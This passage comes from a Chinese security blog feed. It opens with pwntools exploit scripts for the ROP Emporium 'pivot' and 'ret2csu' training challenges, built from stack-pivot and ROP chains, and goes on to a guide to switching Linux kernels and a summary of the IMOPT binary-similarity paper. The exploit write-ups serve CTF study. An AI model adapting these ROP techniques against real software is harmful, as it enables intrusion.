class="line">pop_ebx=<span class="number">0x8048571</span></span><br><span class="line">leave_ret = <span class="number">0x80486a8</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'The Old Gods kindly bestow upon you a place to pivot: '</span>)</span><br><span class="line">pivot_addr = int(p.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">print(hex(pivot_addr))</span><br><span class="line">payload = <span class="string">b''</span></span><br><span class="line">payload += p32(foothold_function_plt)</span><br><span class="line">payload += p32(pop_eax)</span><br><span class="line">payload += p32(foothold_function_got)</span><br><span class="line">payload += p32(mov_ptr_eax_eax)</span><br><span class="line">payload += p32(pop_ebx)</span><br><span class="line">payload += p32(offset)</span><br><span class="line">payload += p32(add_eax_ebx)</span><br><span class="line">payload += p32(call_eax)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">40</span></span><br><span class="line">payload += p32(pivot_addr<span class="number">-4</span>)</span><br><span class="line">payload += p32(leave_ret)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4><span id="px64">x64</span><a href="#px64" class="header-anchor">#</a></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0000000000400ae2 &lt;uselessFunction&gt;:</span></span><br><span class="line"><span class="string">  400ae2:	55                   	push   %rbp</span></span><br><span class="line"><span class="string">  400ae3:	48 89 e5             	mov    %rsp,%rbp</span></span><br><span class="line"><span class="string">  400ae6:	b8 00 00 00 00       	mov    $0x0,%eax</span></span><br><span class="line"><span class="string">  400aeb:	e8 60 fd ff ff       	callq  400850 &lt;foothold_function@plt&gt;</span></span><br><span class="line"><span class="string">  400af0:	bf 01 00 00 00       	mov    $0x1,%edi</span></span><br><span class="line"><span class="string">  400af5:	e8 86 fd ff ff       	callq  400880 &lt;exit@plt&gt;</span></span><br><span class="line"><span class="string">  400afa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0000000000400b00 &lt;usefulGadgets&gt;:</span></span><br><span class="line"><span class="string">  400b00:	58                   	pop    %rax</span></span><br><span class="line"><span class="string">  400b01:	c3                   	retq</span></span><br><span class="line"><span class="string">  400b02:	48 94                	xchg   %rax,%rsp</span></span><br><span class="line"><span class="string">  400b04:	c3                   	retq</span></span><br><span class="line"><span class="string">  400b05:	48 8b 00             	mov    (%rax),%rax</span></span><br><span class="line"><span class="string">  400b08:	c3                   	retq</span></span><br><span class="line"><span class="string">  400b09:	48 01 e8             	add    %rbp,%rax</span></span><br><span class="line"><span class="string">  400b0c:	c3                   	retq</span></span><br><span class="line"><span class="string">  400b0d:	0f 1f 00             	nopl   (%rax)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">p = process(<span class="string">'./pivot'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pivot'</span>)</span><br><span class="line">libp = ELF(<span class="string">'./libpivot.so'</span>)</span><br><span class="line"></span><br><span class="line">foothold_function_plt = elf.plt[<span class="string">'foothold_function'</span>]</span><br><span class="line">foothold_function_got = elf.got[<span class="string">'foothold_function'</span>]</span><br><span class="line">foothold_function_addr = libp.symbols[<span class="string">'foothold_function'</span>]</span><br><span class="line">ret2win_addr = libp.symbols[<span class="string">'ret2win'</span>]</span><br><span class="line">offset = ret2win_addr - foothold_function_addr</span><br><span class="line"></span><br><span class="line">pop_rax= <span class="number">0x400b00</span></span><br><span class="line">xchg_rsp_rax = <span class="number">0x400b02</span></span><br><span class="line">mov_ptr_rax_rax = <span class="number">0x400b05</span></span><br><span class="line">add_rax_rbp = <span class="number">0x400b09</span></span><br><span class="line">call_rax = <span class="number">0x40098e</span></span><br><span class="line">pop_rbp=<span class="number">0x400900</span></span><br><span class="line">leave_ret = <span class="number">0x400ae0</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'The Old Gods kindly bestow upon you a place to pivot: '</span>)</span><br><span class="line">pivot_addr = int(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">print(hex(pivot_addr))</span><br><span class="line">payload = <span class="string">b''</span></span><br><span class="line">payload += p64(foothold_function_plt)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(foothold_function_got)</span><br><span class="line">payload += p64(mov_ptr_rax_rax)</span><br><span class="line">payload += p64(pop_rbp)</span><br><span class="line">payload += p64(offset)</span><br><span class="line">payload += p64(add_rax_rbp)</span><br><span class="line">payload += p64(call_rax)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">40</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(pivot_addr)</span><br><span class="line">payload += p64(xchg_rsp_rax)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3><span id="pret2csu">ret2csu</span><a href="#pret2csu" class="header-anchor">#</a></h3><p>ret2csu，原理参考ctf-wiki，中级ROP章节。</p><p>但是在pwnme函数中，将GOT表都置零了，所以需要先调用frame_init进行初始化</p><h4><span id="px64">x64</span><a href="#px64" class="header-anchor">#</a></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0xdeadcafebabebeef</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">  400880:       4c 89 fa                mov    %r15,%rdx</span></span><br><span class="line"><span class="string">  400883:       4c 89 f6                mov    %r14,%rsi</span></span><br><span class="line"><span class="string">  400886:       44 89 ef                mov    %r13d,%edi</span></span><br><span class="line"><span class="string">  400889:       41 ff 14 dc             callq  *(%r12,%rbx,8)</span></span><br><span class="line"><span class="string">  40088d:       48 83 c3 01             add    $0x1,%rbx</span></span><br><span class="line"><span class="string">  400891:       48 39 dd                cmp    %rbx,%rbp</span></span><br><span class="line"><span class="string">  400894:       75 ea                   jne    400880 &lt;__libc_csu_init+0x40&gt;</span></span><br><span class="line"><span class="string">  400896:       48 83 c4 08             add    $0x8,%rsp</span></span><br><span class="line"><span class="string">  40089a:       5b                      pop    %rbx</span></span><br><span class="line"><span class="string">  40089b:       5d                      pop    %rbp</span></span><br><span class="line"><span class="string">  40089c:       41 5c                   pop    %r12</span></span><br><span class="line"><span class="string">  40089e:       41 5d                   pop    %r13</span></span><br><span class="line"><span class="string">  4008a0:       41 5e                   pop    %r14</span></span><br><span class="line"><span class="string">  4008a2:       41 5f                   pop    %r15</span></span><br><span class="line"><span class="string">  4008a4:       c3                      retq</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./ret2csu'</span>)</span><br><span class="line"></span><br><span class="line">rdx=<span class="number">0xdeadcafebabebeef</span></span><br><span class="line"></span><br><span class="line">init = <span class="number">0x600E10</span></span><br><span class="line">csu_1 = <span class="number">0x400880</span></span><br><span class="line">csu_2 = <span class="number">0x40089a</span></span><br><span class="line">ret2win = <span class="number">0x4007B1</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x20</span>*<span class="string">b'a'</span></span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment">#rbp</span></span><br><span class="line">payload += p64(csu_2)</span><br><span class="line">payload += p64(<span class="number">0</span>)   <span class="comment">#rbx</span></span><br><span class="line">payload += p64(<span class="number">1</span>)   <span class="comment">#rbp</span></span><br><span class="line">payload += p64(init)   <span class="comment">#r12</span></span><br><span class="line">payload += p64(<span class="number">0</span>)   <span class="comment">#r13</span></span><br><span class="line">payload += p64(<span class="number">0</span>)   <span class="comment">#r14</span></span><br><span class="line">payload += p64(rdx)   <span class="comment">#r15</span></span><br><span class="line">payload += p64(csu_1)</span><br><span class="line">payload += p64(<span class="number">0</span>)   <span class="comment">#add rsp,8</span></span><br><span class="line">payload += p64(<span class="number">0</span>)   <span class="comment">#rbx</span></span><br><span class="line">payload += p64(<span class="number">0</span>)   <span class="comment">#rbp</span></span><br><span class="line">payload += p64(<span class="number">0</span>)   <span class="comment">#r12</span></span><br><span class="line">payload += p64(<span class="number">0</span>)   <span class="comment">#r13</span></span><br><span class="line">payload += p64(<span class="number">0</span>)   <span class="comment">#r14</span></span><br><span class="line">payload += p64(<span class="number">0</span>)   <span class="comment">#r15</span></span><br><span class="line">payload += p64(ret2win)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>stack_overflow</category>
        <category>ROP_Emporium</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>stack overflow</tag>
        <tag>ROP Emporium</tag>
      </tags>
  </entry>
  <entry>
    <title>linux切换内核版本</title>
    <url>/a453e6a.html</url>
    <content><![CDATA[<p>内核文件包含：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">linux-image-版本号：内核映像文件</span><br><span class="line">linux-headers-版本号：内核头文件</span><br><span class="line">linux-image-extra-版本号：内核扩展文件</span><br></pre></td></tr></table></figure><a id="more"></a><h3><span id="pqie-huan-dao-gu-ding-nei-he-ban-ben">切换到固定内核版本</span><a href="#pqie-huan-dao-gu-ding-nei-he-ban-ben" class="header-anchor">#</a></h3><ol><li><p>虚拟机安装 ubuntu 16.04</p></li><li><p>装一些软件</p></li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install vim</span><br></pre></td></tr></table></figure><ol start="3"><li>修改<code>/etc/apt/sources.list</code>，加入</li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deb http:&#x2F;&#x2F;security.ubuntu.com&#x2F;ubuntu trusty-security main</span><br></pre></td></tr></table></figure><ol start="4"><li>查看版本内核</li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname -r</span><br></pre></td></tr></table></figure><ol start="5"><li>查找可以切换的内核</li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-cache search linux</span><br></pre></td></tr></table></figure><ol start="6"><li>安装新内核</li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt-get install linux-image-3.13.0-24-generic linux-headers-3.13.0-24-generic linux-image-extra-3.13.0-24-generic</span><br></pre></td></tr></table></figure><ol start="7"><li>查看是否成功</li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dpkg -l | grep 3.13.0-24-generic</span><br></pre></td></tr></table></figure><ol start="8"><li><code>vim</code>修改grub配置文件<code>/etc/default/grub</code></li></ol><p>将</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GRUB_DEFAULT&#x3D;0</span><br></pre></td></tr></table></figure><p>修改为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GRUB_DEFAULT&#x3D;&quot;Advanced options for Ubuntu&gt;Ubuntu, with Linux 3.13.0-24-generic&quot;</span><br></pre></td></tr></table></figure><p>或者一句话</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sed -ir &quot;s&#x2F;GRUB_DEFAULT&#x3D;.*&#x2F;GRUB_DEFAULT&#x3D;\&quot;Advanced options for Ubuntu&gt;Ubuntu, with Linux 3.13.0-24-generic\&quot;&#x2F;g&quot; &#x2F;etc&#x2F;default&#x2F;grub</span><br></pre></td></tr></table></figure><ol start="9"><li>更新<code>grub</code></li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update-grub</span><br></pre></td></tr></table></figure><ol start="10"><li>重启 <code>reboot</code></li><li>查看新内核<code>uname -r</code></li></ol><h3><span id="pqie-huan-dao-zi-bian-yi-ban-ben">切换到自编译版本</span><a href="#pqie-huan-dao-zi-bian-yi-ban-ben" class="header-anchor">#</a></h3><ol><li>下载<code>linux kernel</code>源码并解压</li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget -c https:&#x2F;&#x2F;github.com&#x2F;torvalds&#x2F;linux&#x2F;archive&#x2F;v5.10-rc6.zip</span><br><span class="line">unzip v5.10-rc6.zip</span><br></pre></td></tr></table></figure><ol start="2"><li>安装依赖</li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt update</span><br><span class="line">sudo apt-get install ncurses-dev bison flex libssl-dev bc libelf-dev</span><br></pre></td></tr></table></figure><ol start="3"><li>在源码根目录下配置文件</li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">menuconf</span><br></pre></td></tr></table></figure><ol start="4"><li>为了防止突然中断导致失败，重新编译还是会重新编译已编译的文件，所有选择使用ccache进行加速</li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install ccache</span><br></pre></td></tr></table></figure><p>修改<code>.bashrc</code>，加入</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export CCACHE_DIR&#x3D;&quot;&#x2F;root&#x2F;.ccache&quot; </span><br><span class="line">export CC&#x3D;&quot;ccache gcc&quot;</span><br><span class="line">export CXX&#x3D;&quot;ccache g++&quot;</span><br><span class="line">export PATH&#x3D;&quot;&#x2F;usr&#x2F;lib&#x2F;ccache:$PATH&quot;</span><br></pre></td></tr></table></figure><p><code>source ~/.bashrc</code></p><p>修改缓存大小</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ccache -M 10G</span><br></pre></td></tr></table></figure><ol start="5"><li>安装模块和内核和内核文件头</li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">make modules_install</span><br><span class="line">make install</span><br><span class="line">make headers_install</span><br></pre></td></tr></table></figure><ol start="6"><li>修改<code>/etc/default/grub</code>，将<code>GRUB_CMDLINE_LINUX_DEFAULT</code>设为<code>text</code></li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GRUB_DEFAULT&#x3D;0</span><br><span class="line"># GRUB_DEFAULT&#x3D;&quot;Advanced options for Ubuntu&gt;Ubuntu, with Linux 3.13.0-24-generic&quot;</span><br><span class="line">GRUB_HIDDEN_TIMEOUT&#x3D;</span><br><span class="line">GRUB_HIDDEN_TIMEOUT_QUIET&#x3D;true</span><br><span class="line">GRUB_TIMEOUT&#x3D;10</span><br><span class="line">GRUB_DISTRIBUTOR&#x3D;&#96;lsb_release -i -s 2&gt; &#x2F;dev&#x2F;null || echo Debian&#96;</span><br><span class="line">GRUB_CMDLINE_LINUX_DEFAULT&#x3D;&quot;text&quot;</span><br></pre></td></tr></table></figure><ol start="7"><li>更新<code>grub</code></li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update-grub</span><br></pre></td></tr></table></figure><ol start="8"><li>重启<code>reboot</code></li><li>查看新内核<code>uname -r</code></li></ol><h3><span id="pxin-jian-yong-hu">新建用户</span><a href="#pxin-jian-yong-hu" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo useradd -m meow -s &#x2F;bin&#x2F;bash</span><br><span class="line">sudo passwd meow</span><br><span class="line">su meow</span><br></pre></td></tr></table></figure><h3><span id="pcan-kao-zi-liao">参考资料</span><a href="#pcan-kao-zi-liao" class="header-anchor">#</a></h3><ul><li><p><a href="https://www.jianshu.com/p/e445bbcfee04">https://www.jianshu.com/p/e445bbcfee04</a></p></li><li><p><a href="https://www.cnblogs.com/carle-09/p/12377128.html">https://www.cnblogs.com/carle-09/p/12377128.html</a></p></li><li><p><a href="https://blog.csdn.net/weixin_40774605/article/details/107214622">https://blog.csdn.net/weixin_40774605/article/details/107214622</a></p></li><li><p><a href="https://blog.csdn.net/zhanjia0609/article/details/105999988">https://blog.csdn.net/zhanjia0609/article/details/105999988</a></p></li></ul>]]></content>
      <categories>
        <category>research</category>
        <category>linux_kernel</category>
      </categories>
      <tags>
        <tag>research</tag>
        <tag>linux kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>Similarity of Binaries Across Optimization Levels and Obfuscation(ESORICS 2020)</title>
    <url>/930679b9.html</url>
    <content><![CDATA[<blockquote><p>现有的二进制相似度检测工作并没有很好的解决编译优化和混淆带来的影响，所以作者提出了<code>IMOPT</code>来重新优化代码，用于提高代码相似性检测的准确率。</p><p>该方法在测试集上和原本的Asm2vec相比，将精度提高了22.7%，并且可以缓解ollvm混淆带来的影响</p></blockquote><a id="more"></a><h3><span id="pintroduction">Introduction</span><a href="#pintroduction" class="header-anchor">#</a></h3><p>现有工作的不足：</p><ul><li>静态方法：只统计静态特征，很难揭示语义特征</li><li>动态方法：一旦加入混淆，junk code等会严重影响代码相似性检测</li></ul><p>所以作者提出了<code>IMOPT</code>方法，通过<code>re-optimize lifted binary</code>缓解编译优化和混淆对代码相似性检测的影响，提高准确率。</p><p>由于作者是在二进制上进行这项工作，因此不得不面对下面两个主要的挑战：</p><ul><li><strong>挑战1</strong>：对二进制代码的优化需要准确的指针分析，然而编译过程删除了很多变量信息。即使是编译器，在做指针分析时，也会出错：例如对于下面的代码，不优化时会输出0，而使用<code>O2</code>优化时，会输出1(这是真的，我帮大家试过了)。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">confound_compiler_opt</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b,*c;</span><br><span class="line">    <span class="keyword">if</span>(&amp;b &gt; &amp;a) c = &amp;b<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">else</span> c = &amp;b+<span class="number">1</span>;</span><br><span class="line">    *c = <span class="number">11</span>;</span><br><span class="line">    a = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">return</span> *c - a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = confound_compiler_opt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>挑战2</strong>：在指针分析中需要对成本和精度进行折中考虑。</li></ul><p>对于上面的两个挑战，作者也在文中提出了相应的解决方案：</p><ul><li><p><strong>对于挑战1</strong>：集成精确的指针分析框架，并实现了<code>canonicalization</code>和<code>elimination</code>两类优化，这两类对相似性比较的影响最大。</p><p><code>canonicalization</code>：将逻辑上等价的表达式转换成统一形式</p><p><code>elimination</code>：通过可达性分析删除无用或不可达的代码</p></li><li><p>**对于挑战2：**提出了<code>immediate SSA(static single-assignment) transforming algorithm</code>（立即的SSA转换算法），将变量或指针即时的转换为<code>SSA</code>形式。采用<code>SSA</code>，是速度和精确度权衡的结果</p></li></ul><p><strong>主要贡献</strong>：</p><ul><li><code>immediate SSA</code>，<code>O(1)</code>复杂度的快速准确的指针分析</li><li>指针分析框架</li><li>二进制代码重优化方法</li><li><code>IMOPT</code>实现</li></ul><h3><span id="pji-ben-gai-nian">基本概念</span><a href="#pji-ben-gai-nian" class="header-anchor">#</a></h3><h4><span id="pssa">SSA</span><a href="#pssa" class="header-anchor">#</a></h4><p>静态单赋值：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x &#x3D; 1;                         x1 &#x3D; 1;</span><br><span class="line">y &#x3D; 2; 						&#x3D;&#x3D;&gt;          y1 &#x3D; 2;</span><br><span class="line">x &#x3D; x - y;                     x2 &#x3D; x1 - y1;</span><br><span class="line">y &#x3D; x + y;                     y2 &#x3D; x2 + y1;</span><br></pre></td></tr></table></figure><p>好处是一个<code>use</code>只有一个<code>def</code>，方便做<code>def-use</code>分析。同名变量有相同的值，变量的使用只有唯一的定义</p><h4><span id="pdominator">Dominator</span><a href="#pdominator" class="header-anchor">#</a></h4><p>控制节点：</p><p><code>n dominates m (n dom m)</code> ：从<code>entry</code>节点到<code>m</code>的所有路径都需要经过节点<code>n</code>，称<code>n</code>是<code>m</code>的<code>dominator</code></p><h4><span id="pdominance-frontier">Dominance Frontier</span><a href="#pdominance-frontier" class="header-anchor">#</a></h4><p><code>Dominance Frontier</code>表示控制流图中聚合的点</p><p>对于图节点<code>N</code>，<code>DF(N)</code>是一个集合，该集合包含<code>Z</code>，如果<code>Z</code>满足：</p><ul><li><code>N</code>是<code>Z</code>某个前驱节点的控制节点</li><li><code>N</code>不是<code>Z</code>的控制节点</li></ul><p>即$DF(N) = {Z | (\exists p \in Pred(Z)) N \ dom \ p \land !N \ dom\ Z }$</p><p>这个东西可以用来实现最小<code>SSA</code>，并引入<code>PHI</code>节点。例如通过下面的控制流图</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-12-01-114552.jpg" alt="image-20201124113007402"></p><p>我们可以得到<code>Dominance Frontier</code>如下</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-12-01-114604.jpg" alt="image-20201124113410026"></p><p>即块2和块8和块9中的对变量<code>x</code>的定义会在块5处聚合。</p><h4><span id="pphi-function">PHI function</span><a href="#pphi-function" class="header-anchor">#</a></h4><p>为了引入最小SSA，需要利用<code>Dominance Frontier</code>加入PHI节点，示例如下</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-12-01-114613.jpg" alt="image-20201124113904892"></p><p>对于左侧示例，我们可以得到<code>Dominance Frontier</code>并在聚合处加入PHI节点</p><h4><span id="pyi-xie-zhu-yu">一些术语</span><a href="#pyi-xie-zhu-yu" class="header-anchor">#</a></h4><ul><li><p>前向块(<code>Forward Block</code>)，后向块(<code>Backward Block</code>)，回边(<code>Back edge</code>)：如果有<strong>a dom b</strong>，那么边<code>a-&gt;b</code> 叫做回边，回边指向的块为后向块，其余都是前向块</p></li><li><p>前向定义(<code>Forward Definition</code>)，后向定义<code>Backward Defination</code>：回边起点如果存在对回边终点的变量定义，则为后向定义，否则为前向定义</p></li><li><p>反向可达图(<code>Backward reachable graph</code>)：感觉就是CFG，然后将边反向</p></li></ul><h4><span id="pji-shi-xing">即时性</span><a href="#pji-shi-xing" class="header-anchor">#</a></h4><p>即时性是动态地将代码转换成<code>SSA</code>形式并有效维护信息的关键。</p><p>如果算法在处理时满足下面两个不变量，那么该算法具有即时性：</p><ul><li>全局不变性：处理一个基本块前，对于块中每个变量v：1)如果只有一个<code>def</code>可以到达该基本块，且基本块前无PHI节点，应记录v的下标；2)否则，应该插入PHI节点，且PHI节点中下标应与其他def下标不同。</li><li>局部不变性：处理一个基本块后，这个基本块中使用的变量只能存在一个<code>def</code>点可以到达<code>use</code>点，且下标需要一致 。</li></ul><p>全局不变性确保每个传入的定义都被记录，且插入必要的<code>PHI</code>节点</p><p>局部不变性确保每个<code>use</code>都与<code>def</code>关联</p><p>这两点也保证了<code>SSA</code>的正确性</p><p>**演绎条件(Condition 1) **：算法在CFG的逆后续(<code>Reverse post-order</code>)遍历中进行，在处理块i前，保证每个已处理的块j都满足即时性<code>(j&lt;i)</code></p><p>逆后续遍历：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">postorder</span><span class="params">(graph, root)</span>:</span></span><br><span class="line">    <span class="string">"""Return a post-order ordering of nodes in the graph."""</span></span><br><span class="line">    visited = set()</span><br><span class="line">    order = []</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dfs_walk</span><span class="params">(node)</span>:</span></span><br><span class="line">        visited.add(node)</span><br><span class="line">        <span class="keyword">for</span> succ <span class="keyword">in</span> graph.successors(node):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> succ <span class="keyword">in</span> visited:</span><br><span class="line">                dfs_walk(succ)</span><br><span class="line">        order.append(node)</span><br><span class="line">    dfs_walk(root)</span><br><span class="line">    <span class="keyword">return</span> order</span><br></pre></td></tr></table></figure><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-12-01-114620.jpg" alt="image-20201124143708676" style="zoom:50%"><p>对于上述示例，有：</p><ul><li>Pre-order: A, C, B, D, E, T</li><li>Post-order: D, B, E, C, T, A</li><li>Reverse-post-order(RPO): A, T, C, E, B, D</li></ul><p>示例结果不太符合我们习惯，比如是逆时针访问还是按字母顺序访问，简单来说逆后续遍历就是后续遍历的反向。在<code>SSA</code>图中，这样保证了在处理时<code>use</code>肯定在<code>def</code>后</p><h4><span id="pyi-xie-yin-li">一些引理</span><a href="#pyi-xie-yin-li" class="header-anchor">#</a></h4><p><code>Symbols B, D, S, V are used to represent the set of blocks, definitions, statements and variables.</code></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-12-01-114627.jpg" alt="image-20201124144805085"></p><h3><span id="pimssa-suan-fa">IMSSA 算法</span><a href="#pimssa-suan-fa" class="header-anchor">#</a></h3><h4><span id="pzhu-han-shu">主函数</span><a href="#pzhu-han-shu" class="header-anchor">#</a></h4><p>在实现IMSSA算法时，会维护下列信息</p><p><code>Symbols B, D, S, V are used to represent the set of blocks, definitions, statements and variables.</code></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-12-01-114643.jpg" alt="image-20201124152513302"></p><p>即<code>def-use</code>边，可达边，Dominating def，最大SSA下标数。</p><p>算法按照<code>RPO</code>顺序对函数进行处理，如下</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-12-01-114650.jpg" alt="image-20201124152646888"></p><p>主函数十分简洁明了，不需要过多解释</p><h4><span id="pzhao-ssa-de-use-he-def-dian">找SSA的use和def点</span><a href="#pzhao-ssa-de-use-he-def-dian" class="header-anchor">#</a></h4><p>补充：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RHS: 赋值操作的右侧，例如 x &#x3D; y + z中的 y 和 z</span><br><span class="line">LHS: 赋值操作的左侧，例如 x &#x3D; y + z中的 x</span><br></pre></td></tr></table></figure><p>是正常的SSA生成的算法，不是新方法</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-12-01-114702.jpg" alt="image-20201124153537218"></p><ol><li><code>IF</code>:s是一个<code>phi</code>函数，且s属于基本块<code>bi</code>，遍历所有可以到达<code>bi</code>的块<code>bj</code>，修改块<code>bj</code>RHS中对变量v使用的下标</li><li><code>ELSE</code>:否则，修改<code>bi</code>中RHS对变量v的下标</li></ol><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-12-01-114713.jpg" alt="image-20201124153547183"></p><ol><li><code>LINE2</code>：LHS中找到变量v</li><li><code>LINE3</code>：变量v的下标++</li><li><code>LINE4</code>：替换变量名</li><li><code>LINE5-6</code>：对RHS中用到的变量，加入<code>def-use</code>对集合<code>DU</code>中</li><li><code>LINE7</code>：将对v的定义加入<code>Vdef</code>中</li></ol><h4><span id="pdui-dan-tiao-yu-ju-state-de-chu-li">对单条语句state的处理</span><a href="#pdui-dan-tiao-yu-ju-state-de-chu-li" class="header-anchor">#</a></h4><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-12-01-114726.jpg" alt="image-20201124153148061"></p><ol><li><code>LINE2</code>：找use点，改变量名</li><li><code>LINE3</code>：指针分析，后面会将具体的算法</li><li><code>LINE4-6</code>：找def点，改变量名</li></ol><h4><span id="pdef-chuan-bo-he-ke-da-xing-chuan-bo">def传播和可达性传播</span><a href="#pdef-chuan-bo-he-ke-da-xing-chuan-bo" class="header-anchor">#</a></h4><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-12-01-114738.jpg" alt="image-20201124153728459"></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-12-01-114746.jpg" alt="image-20201124153737442"></p><p><code>PROPAGATE</code>会在基本块<code>b</code>的<code>dominance frontiers</code>引入PHI节点，并且设置该PHI节点为未访问状态</p><p><code>PropagateReachability</code>是为了看当前块是否可以执行到该块的后继(无用分支)，当处理到后继节点时，会设置PHI节点为访问过的状态。</p><p>我感觉这两个函数可以理解为PHI节点会在dominator 节点引入，并且在dominated节点处理。</p><h4><span id="pqian-xiang-kuai-fen-xi">前向块分析</span><a href="#pqian-xiang-kuai-fen-xi" class="header-anchor">#</a></h4><p>根据引理2和引理3，实现前向块分析如下</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-12-01-114757.jpg" alt="image-20201124153138441"></p><h4><span id="pfan-xiang-kuai-fen-xi">反向块分析</span><a href="#pfan-xiang-kuai-fen-xi" class="header-anchor">#</a></h4><p>根据引理4，实现反向块分析如下</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-12-01-114806.jpg" alt="image-20201124153824132"></p><ol><li><code>LINE2</code>：找包含回边的子图，将反向块变换成前向块</li><li><code>LINE3</code>：得到RPO序列</li><li><code>LINE4-LINE6</code>：按照前向块处理该子图</li></ol><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-12-01-114817.jpg" alt="image-20201125160249077"></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-12-01-114829.jpg" 